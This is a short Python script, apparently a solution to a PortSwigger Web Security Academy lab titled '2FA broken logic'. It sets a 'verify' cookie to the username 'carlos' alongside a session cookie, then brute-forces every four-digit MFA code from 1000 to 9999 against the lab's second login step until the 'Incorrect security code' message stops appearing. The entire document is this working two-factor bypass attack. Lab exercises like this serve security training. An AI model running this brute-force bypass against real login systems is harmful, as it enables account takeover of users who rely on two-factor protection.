# 2FA broken logic

import requests
from rich.progress import track

login_page = "https://ace81f4e1f891c39807fc37d00460063.web-security-academy.net/login2"

cookies = {"verify" : "carlos", "session" : "nyKVCmZpFPDQaSKLdoAD2Of6CbwddCAb"}

for mfa_i in track(range(1000,10000)):

    inputs = {"mfa-code" : mfa_i}

    session = requests.session()
    response = session.post(login_page,  data=inputs, cookies=cookies)

    if "Incorrect security code" in response.text:
        print("Incorrect code :", mfa_i)
        pass
    else:
        print("Found correct code :", mfa_i)
        exit()
